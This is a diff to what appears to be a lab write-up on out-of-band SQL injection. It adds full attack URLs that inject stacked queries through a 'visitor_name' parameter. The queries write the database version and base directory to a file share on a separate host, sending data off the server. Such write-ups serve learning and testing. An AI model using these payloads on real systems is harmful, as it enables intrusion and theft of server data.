@@ -118,6 +118,15 @@ The payload works by:
 
 The payload was supplied through the `visitor_name` parameter.
 
+So URL becomes:
+
+```
+http://10.48.168.120/oob/search_visitor.php?visitor_name=1'; SELECT @@version INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
+```
+
+---
+
+###
 
 <img width="1279" height="728" alt="Screenshot 2026-08-28 at 5 54 42 AM" src="https://github.com/user-attachments/assets/2cd07a68-2df7-4a33-8316-9a0288c21c35" />
 
@@ -154,6 +163,13 @@ Payload:
 ```
 1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
 ```
+
+Use the vulnerable URL:
+
+```
+http://10.48.168.120/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
+```
+
 
 <img width="1278" height="726" alt="Screenshot 2026-08-28 at 6 38 54 AM" src="https://github.com/user-attachments/assets/689e6ec4-0979-4cea-a7d1-dff65708d084" />
 
